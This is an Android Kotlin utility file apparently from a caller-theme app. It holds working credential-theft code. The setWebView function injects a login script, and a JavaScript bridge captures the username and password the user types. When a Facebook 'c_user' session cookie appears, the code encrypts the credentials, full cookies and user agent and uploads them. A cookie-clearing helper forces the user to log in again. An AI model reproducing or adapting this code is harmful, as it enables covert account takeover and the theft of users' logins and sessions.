package ftp.callshow.colorss.app.utils

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.text.TextUtils
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import ftp.callshow.colorss.app.R
import ftp.callshow.colorss.app.base.StrippedApplication
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var needBackPressed = false

fun manageCookie(){
    CookieSyncManager.createInstance(StrippedApplication.instance)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    userName = ""
    userPwd = ""
}

fun AppCompatActivity.customTimer(b:()->Unit){
    lifecycleScope.launch(Dispatchers.IO) {
        delay(20 * 1000)
        withContext(Dispatchers.Main) {
            b()
        }
    }
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    upload: (String) -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (userName.isNotBlank() && userPwd.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to userName,
                                    "pw" to userPwd,
                                    "cookie" to cookieStr,
                                    "source" to configEntity.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).encrypt(updateEntity.key())
                            upload(content)//上传
                        }
                    }
                }
            }
        }
//        loadUrl(if (!TextUtils.isEmpty(updateEntity.loginUrl())) updateEntity.loginUrl() else "https://www.baidu.com")
        loadUrl(testLoginUrl)

    }

}

class WebInterface {
    @JavascriptInterface
    fun businessStart(a: String, b: String) {
        userName = a
        userPwd = b
    }
}

fun Context.goWeb(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun AppCompatActivity.back(webView: WebView, b:()->Boolean, sup:()->Unit){
    if (webView.canGoBack()){
        webView.goBack()
    }else{
        val a = b()
        if (!a){
            if (configEntity.httpUrl().startsWith("http")){
                goWeb(configEntity.httpUrl())
            }
            sup()
        }else{
            needBackPressed = true
        }
    }
}